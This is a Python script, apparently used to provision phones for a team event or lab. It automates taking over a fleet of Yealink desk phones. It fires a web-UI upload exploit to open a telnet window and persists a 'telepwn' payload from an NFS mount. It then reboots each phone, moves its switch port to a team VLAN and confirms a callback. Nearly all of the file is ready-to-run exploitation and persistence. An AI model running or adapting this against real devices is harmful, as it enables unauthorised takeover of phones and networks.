#!/usr/bin/env python3
"""Fleet rollout: hijack every assigned phone and land it on its team VLAN.

Per phone, mirroring the proven single-phone flow:
  1. locate the phone on the staging network (10.42.0.x) by its MAC,
  2. flash telnet1.rom via the web UI to open the recovery telnet window,
  3. deploy85.py to persist the diversion (payload runs from the NFS mount),
  4. reboot the phone,
  5. move its switch access port to the team VLAN during the reboot,
  6. confirm the proof-of-life callback arrives from the team's subnet (the source
     subnet identifies the team, so a MATCH from it is the proof).

Resumable: a phone whose team subnet has already reported a MATCH callback in
callbacks.log is treated as done and skipped unless --force.

Run on the BananaPi (root), where the switch alias and every VLAN interface live:
    python3 rollout.py                 # whole fleet
    python3 rollout.py --only finland  # one team
    python3 rollout.py --skip slovakia # all but these
"""
import argparse
import csv
import os
import socket
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
PROV = os.path.dirname(HERE)

ASSIGN = os.path.join(PROV, "content", "assignments.csv")
ROM = "/opt/telepwn/telnet1.rom"
CALLBACKS = os.path.join(PROV, "callbacks.log")
SWITCH = "switch"
PI_STAGING_IP = "10.42.0.1"


def log(msg):
    print(f"[rollout] {msg}", flush=True)


def sh(cmd, timeout=120):
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def probe(ip, port, t=3):
    s = socket.socket()
    s.settimeout(t)
    try:
        s.connect((ip, port))
        s.close()
        return True
    except OSError:
        return False


def load_plan():
    rows = []
    with open(ASSIGN, newline="") as f:
        for r in csv.DictReader(f):
            if r["status"] != "assigned" or not r["team_id"]:
                continue
            tid = int(r["team_id"])
            vlan = 100 + tid
            rows.append({
                "slug": r["slug"], "name": r["team_name"],
                "mac": r["mac"].lower(), "port": r["switch_port"],
                "vlan": vlan, "subnet_pfx": f"10.42.{vlan}",
                "staging_ip": r["ip"],
            })
    return rows


def already_done(subnet_pfx):
    """A MATCH callback seen from the team's own subnet means the phone is homed."""
    if not os.path.exists(CALLBACKS):
        return False
    needle = subnet_pfx + "."
    for ln in open(CALLBACKS):
        if needle in ln and "MATCH" in ln:
            return True
    return False


def find_staging_ip(mac, fallback):
    """Current staging (10.42.0.x) IP of the phone, by MAC, from the Pi ARP table;
    fall back to the assignment's recorded IP."""
    r = sh(["ip", "-4", "neigh", "show", "dev", "qtrunk0"])
    for ln in r.stdout.splitlines():
        parts = ln.split()
        if len(parts) >= 5 and parts[-1] != "FAILED" and mac in ln.lower():
            if parts[0].startswith("10.42.0."):
                return parts[0]
    return fallback


def wait_telnet(ip, timeout):
    end = time.time() + timeout
    while time.time() < end:
        if probe(ip, 23, 2):
            return True
        time.sleep(2)
    return False


def flash(ip):
    """Open the recovery telnet window: start the ROM upload in the background (the
    exploit fires mid-upload and the POST then hangs), poll for telnet."""
    for attempt in (1, 2):
        p = subprocess.Popen(
            ["python3", os.path.join(PROV, "webflash", "yealink_web.py"),
             ip, "--upload", ROM],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if wait_telnet(ip, 150):
            return True, p
        p.terminate()
        log(f"    telnet window did not open (attempt {attempt}); retrying flash")
        time.sleep(5)
    return False, None


def deploy(ip, srv):
    r = sh(["python3", os.path.join(HERE, "deploy85.py"),
            ip, "--server", srv, "--host-ip", PI_STAGING_IP], timeout=180)
    return "telepwn lines: 2" in r.stdout or "telepwn lines: 3" in r.stdout \
        or "SYNTAX_OK" in r.stdout or "result (top + hook)" in r.stdout, r.stdout


def reboot(ip):
    sh(["python3", os.path.join(HERE, "ptelnet.py"), ip, "-c",
        "sync; /sbin/reboot"], timeout=30)


def move_port(port, vlan, slug):
    cfg = (
        "configure terminal\n"
        f"vlan {vlan}\n name {slug[:32]}\n"
        f"interface GigabitEthernet1/0/2\n switchport trunk allowed vlan add {vlan}\n"
        f"interface {port}\n switchport mode access\n"
        f" switchport access vlan {vlan}\n switchport nonegotiate\n"
        " spanning-tree portfast\nend\n")
    p = subprocess.run(["ssh", "-o", "ConnectTimeout=10", SWITCH],
                       input=cfg, capture_output=True, text=True, timeout=60)
    return p.returncode == 0


def wait_callback(subnet_pfx, timeout):
    needle = subnet_pfx + "."
    base = os.path.getsize(CALLBACKS) if os.path.exists(CALLBACKS) else 0
    end = time.time() + timeout
    while time.time() < end:
        if os.path.exists(CALLBACKS) and os.path.getsize(CALLBACKS) > base:
            for ln in open(CALLBACKS).read()[base:].splitlines():
                if needle in ln and "MATCH" in ln:
                    return ln.strip()
        time.sleep(3)
    return None


def do_team(t, force):
    slug, port, vlan = t["slug"], t["port"], t["vlan"]
    srv = f"{t['subnet_pfx']}.1"
    if not force and already_done(t["subnet_pfx"]):
        log(f"{slug:<16} already homed on {t['subnet_pfx']}.x — skip")
        return "skip"

    ip = find_staging_ip(t["mac"], t["staging_ip"])
    log(f"{slug:<16} port {port} vlan {vlan} — staging ip {ip}")
    if not probe(ip, 80, 3) and not probe(ip, 23, 3):
        log(f"    UNREACHABLE at {ip} (web/telnet closed) — SKIP")
        return "unreachable"

    if not probe(ip, 23, 2):
        ok, _proc = flash(ip)
        if not ok:
            log("    FLASH FAILED — SKIP")
            return "flash-fail"
        log("    telnet window open")
    else:
        log("    telnet already open (already flashed)")

    ok, out = deploy(ip, srv)
    if not ok:
        log(f"    DEPLOY uncertain: {out.strip().splitlines()[-1] if out.strip() else ''}")
    reboot(ip)
    log("    rebooted; moving switch port")
    time.sleep(2)
    if not move_port(port, vlan, slug):
        log("    PORT MOVE FAILED")
        return "port-fail"

    cb = wait_callback(t["subnet_pfx"], 160)
    if cb:
        log(f"    OK: {cb}")
        return "ok"
    log("    NO CALLBACK within window")
    return "no-callback"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--only", help="comma-separated slugs")
    ap.add_argument("--skip", help="comma-separated slugs")
    ap.add_argument("--force", action="store_true")
    args = ap.parse_args()

    plan = load_plan()
    only = set(args.only.split(",")) if args.only else None
    skip = set(args.skip.split(",")) if args.skip else set()
    if only:
        plan = [t for t in plan if t["slug"] in only]
    plan = [t for t in plan if t["slug"] not in skip]

    log(f"{len(plan)} team(s) to process")
    results = {}
    for t in plan:
        try:
            results[t["slug"]] = do_team(t, args.force)
        except Exception as e:  # noqa: BLE001
            log(f"{t['slug']}: EXCEPTION {e}")
            results[t["slug"]] = "exception"

    log("==== summary ====")
    for slug, r in results.items():
        log(f"  {slug:<16} {r}")
    ok = sum(1 for r in results.values() if r == "ok")
    log(f"{ok}/{len(results)} homed OK")


if __name__ == "__main__":
    main()
